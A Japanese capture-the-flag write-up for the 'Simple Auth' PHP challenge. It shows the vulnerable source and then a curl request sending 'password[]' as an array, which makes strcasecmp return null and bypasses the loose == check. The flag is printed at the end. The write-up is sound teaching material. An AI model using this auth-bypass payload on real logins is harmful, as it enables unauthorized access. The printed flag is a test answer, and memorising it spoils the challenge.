Q32.Simple Auth 50pt
--------------------

問題
----
> simple vulnerability
> http://ctfq.sweetduet.info:10080/~q32/auth.php
> source


```php
<!DOCTYPE html>
<html>
  <head>
    <title>Simple Auth</title>
  </head>
  <body>
    <div>
<?php
$password = 'FLAG_????????????????';
if (isset($_POST['password']))
    if (strcasecmp($_POST['password'], $password) == 0)
        echo "Congratulations! The flag is $password";
    else
        echo "incorrect...";
?>
    </div>
    <form method="POST">
      <input type="password" name="password">
      <input type="submit">
    </form>
  </body>
</html>
```

解き方
-----

PHPのWeb問です。

とりあえず問題のページにアクセスしてみます。

```html
$ curl http://ctfq.sweetduet.info:10080/~q32/auth.php
<!DOCTYPE html>
<html>
  <head>
    <title>Simple Auth</title>
  </head>
  <body>
    <div>
    </div>
    <form method="POST">
      <input type="password" name="password">
      <input type="submit">
    </form>
  </body>
</html>
```

適当な文字列をフォームに投げてみます。

```html
$ curl -XPOST -d'password=test' http://ctfq.sweetduet.info:10080/~q32/auth.php
<!DOCTYPE html>
<html>
  <head>
    <title>Simple Auth</title>
  </head>
  <body>
    <div>
incorrect...    </div>
    <form method="POST">
      <input type="password" name="password">
      <input type="submit">
    </form>
  </body>
</html>
```

問題文のPHPは正常に動作しています。

`strcasecmp`について調べると、`引数に配列を渡すことで結果がnullになる性質`があるようです。

```php
$ php -r "echo (strcasecmp([], 'a') === null)?'ok':'ng';"
PHP Warning:  strcasecmp() expects parameter 2 to be string, array given in Command line code on line 1
ok
```

今回のケースの脆弱性は`strcasecmpの結果の比較に==を使用していること`といえるので、次のような形になるようにリクエストしてやればよいです。

```php
$ php -r "if (strcasecmp([0], 'FLAG') == 0) echo 'ok'; else echo 'ng';"
PHP Warning:  strcasecmp() expects parameter 1 to be string, array given in Command line code on line 1
ok
```

これを利用して今回は`password`を配列にして適当な値を渡せばよいです。

```php
$ curl -XPOST -d'password[]=test' http://ctfq.sweetduet.info:10080/~q32/auth.php
<!DOCTYPE html>
<html>
  <head>
    <title>Simple Auth</title>
  </head>
  <body>
    <div>
Congratulations! The flag is FLAG_VQcTWEK7zZYzvLhX    </div>
    <form method="POST">
      <input type="password" name="password">
      <input type="submit">
    </form>
  </body>
</html>
```

FLAG
-----
`FLAG_VQcTWEK7zZYzvLhX`

